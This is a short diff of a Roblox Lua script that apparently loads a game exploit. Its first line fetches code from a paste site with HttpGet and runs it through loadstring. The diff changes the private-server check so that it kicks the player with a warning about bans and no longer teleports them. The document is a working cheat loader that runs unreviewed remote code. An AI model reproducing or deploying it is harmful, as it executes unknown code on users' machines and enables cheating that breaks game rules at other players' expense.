@@ -1,14 +1,6 @@
 loadstring(game:HttpGet("https://cdn.sourceb.in/bins/PxNNkRZvoV/0"))()
 
-local Players = game:GetService("Players")
-local TeleportService = game:GetService("TeleportService")
-local ReplicatedStorage = game:GetService("RobloxReplicatedStorage")
-
-if ReplicatedStorage:WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
-    TeleportService:TeleportAsync(
-        game.PlaceId,
-        {Players.LocalPlayer},
-        Instance.new("TeleportOptions")
-    )
+if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer()== "VIPServer" then
+    game:GetService("Players").LocalPlayer:Kick("VIP / Private Server detected.\nUsing this script in this server may result in a ban.\nPlease join a PUBLIC server.")
     return
 end
